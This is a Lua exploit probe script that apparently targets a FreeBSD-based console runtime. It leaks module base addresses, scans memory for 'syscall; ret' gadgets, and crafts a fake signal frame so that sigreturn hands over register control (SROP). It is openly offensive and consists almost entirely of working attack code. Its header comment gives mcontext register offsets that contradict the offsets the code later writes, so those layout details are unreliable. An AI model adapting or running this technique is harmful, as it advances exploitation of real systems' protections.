-- CRASH_CLASS: MODERATE
-- PROBE 124c: Sigreturn-Oriented Programming (SROP)
-- sigreturn(417) restores register state from a signal frame on stack.
-- If we can craft a fake sigframe in heap memory and pivot to it,
-- we get arbitrary register control → arbitrary syscall args.
-- This probe tests: (1) does sigreturn(417) work via make_syscall,
-- (2) what happens with a crafted ucontext, (3) can we chain it
-- with the CClosure redirect primitive.
--
-- FreeBSD amd64 sigframe layout (from sys/amd64/include/sigframe.h):
--   struct sigframe { ... struct ucontext sf_uc; }
--   ucontext.uc_mcontext offsets:
--     +0x18: mc_rdi, +0x20: mc_rsi, +0x28: mc_rdx, +0x30: mc_rcx
--     +0x38: mc_r8,  +0x40: mc_r9,  +0x48: mc_rax
--     +0x80: mc_rip, +0x88: mc_cs,  +0x98: mc_rsp, +0xA0: mc_ss

print("=== PROBE 124c: SIGRETURN SROP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Section A: Test sigreturn reachability
print("")
print("--- SECTION A: SIGRETURN BASIC ---")
local sc_sigreturn = make_syscall(417)

-- Try with NULL (should fail safely)
local ok1, ret1 = pcall(function() return sc_sigreturn(uint64(0)) end)
print("sigreturn(NULL): ok=" .. tostring(ok1) .. " ret=" .. tostring(ok1 and to_num(ret1) or "FAIL"))

-- Section B: Get eboot base for gadgets
print("")
print("--- SECTION B: EBOOT BASE ---")
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), uint64(info)) end)
local eboot_lo = to_num(memory.read_dword(info + 0x108))
local eboot_hi = to_num(memory.read_dword(info + 0x10C))
local eboot_size = to_num(memory.read_dword(info + 0x110))
print(string.format("eboot=0x%X%08X size=0x%X", eboot_hi, eboot_lo, eboot_size))

-- Get libkernel base
memory.write_dword(info, 0x160)
pcall(function() sc_info(uint64(0x2001), uint64(info)) end)
local lk_lo = to_num(memory.read_dword(info + 0x108))
local lk_hi = to_num(memory.read_dword(info + 0x10C))
print(string.format("libkernel=0x%X%08X", lk_hi, lk_lo))

-- Section C: Scan eboot for 'syscall; ret' gadget (0F 05 C3)
print("")
print("--- SECTION C: GADGET SCAN ---")
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
local syscall_ret_addr = nil
local ret_addr = nil

-- Scan first 256KB of eboot .text for gadgets
local scan_end = math.min(eboot_size, 0x40000)
for off = 0, scan_end - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local ok, data = pcall(native.read_buffer, addr, 4)
    if ok and data and #data >= 3 then
        local b1, b2, b3 = data:byte(1), data:byte(2), data:byte(3)
        -- syscall; ret = 0F 05 C3
        if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then
            if not syscall_ret_addr then
                syscall_ret_addr = off
                print(string.format("  syscall;ret @ eboot+0x%X", off))
            end
        end
        -- ret = C3
        if b1 == 0xC3 and not ret_addr then
            ret_addr = off
        end
    end
end
if ret_addr then print(string.format("  ret @ eboot+0x%X", ret_addr)) end

-- Section D: Build a fake ucontext for sigreturn
-- Goal: set rax=20 (getpid), rip=syscall;ret gadget, cs=0x43, ss=0x3B
print("")
print("--- SECTION D: CRAFTED SIGFRAME ---")

if syscall_ret_addr then
    -- FreeBSD ucontext_t is ~0x340 bytes
    -- mcontext starts at +0x10 in ucontext
    -- mc_onstack: +0x00, mc_rdi: +0x18, mc_rsi: +0x20, mc_rdx: +0x28
    -- mc_rcx: +0x30, mc_r8: +0x38, mc_r9: +0x40, mc_rax: +0x48
    -- mc_rbx: +0x50, mc_rbp: +0x58, mc_r10: +0x60, mc_r11: +0x68
    -- mc_r12: +0x70, mc_r13: +0x78, mc_r14: +0x80, mc_r15: +0x88
    -- mc_trapno: +0x90, mc_fs: +0x94, mc_gs: +0x98, mc_addr: +0xA0
    -- mc_flags: +0xA8, mc_es: +0xAC, mc_ds: +0xB0, mc_err: +0xB8
    -- mc_rip: +0xC0, mc_cs: +0xC8, mc_rflags: +0xD0
    -- mc_rsp: +0xD8, mc_ss: +0xE0
    -- mc_len: +0xE8 (should be sizeof(mcontext_t) = 0x150 or similar)
    -- uc_flags at +0x00, uc_link at +0x08, uc_sigmask at some offset
    -- uc_mcontext at +0x10

    local frame = memory.alloc(0x400)
    -- Zero entire frame
    for i = 0, 0x3F8, 8 do memory.write_qword(frame + i, uint64(0)) end

    local mc = frame + 0x10  -- mcontext offset within ucontext

    -- Set syscall number in rax
    memory.write_qword(mc + 0x48, uint64(20))  -- rax = 20 (getpid)

    -- Set rip to syscall;ret gadget
    local gadget = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + syscall_ret_addr))
    memory.write_qword(mc + 0xC0, gadget)  -- rip

    -- Set segment registers for userland
    memory.write_qword(mc + 0xC8, uint64(0x43))   -- cs = user code segment
    memory.write_qword(mc + 0xE0, uint64(0x3B))   -- ss = user stack segment

    -- Set rsp to a valid stack area
    local fake_stack = memory.alloc(0x1000)
    memory.write_qword(mc + 0xD8, uint64(fake_stack + 0x800))  -- rsp

    -- Set rflags (IF=1, standard flags)
    memory.write_qword(mc + 0xD0, uint64(0x202))  -- rflags

    -- mc_len
    memory.write_dword(mc + 0xE8, 0x150)

    -- mc_flags: _MC_HASSEGS(0x1) | _MC_HASBASES(0x2)
    memory.write_dword(mc + 0xA8, 0x03)

    -- fs/gs bases (keep 0 for safety)
    -- ds = 0x3B, es = 0x3B, fs = 0x13, gs = 0x1B (standard FreeBSD userland)
    memory.write_dword(mc + 0x94, 0x13)   -- fs
    memory.write_dword(mc + 0x98, 0x1B)   -- gs
    memory.write_dword(mc + 0xAC, 0x3B)   -- es
    memory.write_dword(mc + 0xB0, 0x3B)   -- ds

    print(string.format("frame=0x%X gadget=0x%X stack=0x%X",
        to_num(frame), to_num(gadget), to_num(fake_stack + 0x800)))

    -- Try sigreturn with our crafted frame
    -- If this works, rax=20 → getpid syscall → returns PID
    -- If it crashes, the frame layout is wrong
    print("Calling sigreturn with crafted frame...")
    local ok2, ret2 = pcall(function()
        return sc_sigreturn(uint64(frame))
    end)
    print("sigreturn: ok=" .. tostring(ok2) .. " ret=" .. tostring(ret2))

    if ok2 then
        local rv = to_num(ret2)
        print("  returned_value=" .. rv)
        if rv == pid then
            print("  *** SIGRETURN GETPID SUCCESS - SROP WORKS ***")
        end
    end
else
    print("No syscall;ret gadget found in scanned range")
end

-- Section E: Alternative — test if sigreturn via make_syscall even dispatches
print("")
print("--- SECTION E: SIGRETURN DISPATCH CHECK ---")
-- Try with a pointer to just zeros (should fail but tells us if it dispatches)
local zero_frame = memory.alloc(0x400)
for i = 0, 0x3F8, 8 do memory.write_qword(zero_frame + i, uint64(0)) end

local ok3, ret3 = pcall(function() return sc_sigreturn(uint64(zero_frame)) end)
print("sigreturn(zeros): ok=" .. tostring(ok3) .. " ret=" .. tostring(ok3 and to_num(ret3) or "FAIL"))

print("=== PROBE 124c COMPLETE ===")
